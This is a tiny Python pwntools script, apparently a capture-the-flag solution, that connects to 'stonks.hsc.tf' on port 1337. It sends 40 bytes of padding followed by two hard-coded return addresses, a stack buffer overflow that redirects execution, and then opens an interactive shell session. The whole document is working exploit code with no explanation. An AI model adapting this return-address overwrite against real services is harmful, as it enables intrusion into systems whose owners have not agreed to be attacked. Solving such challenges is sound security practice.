from pwn import *

conn = remote('stonks.hsc.tf',1337)
conn.sendline(b'A'*40+b'\xc2\x12\x40\x00\x00\x00\x00\x00\x58\x12\x40\x00\x00\x00\x00\x00')
conn.interactive()
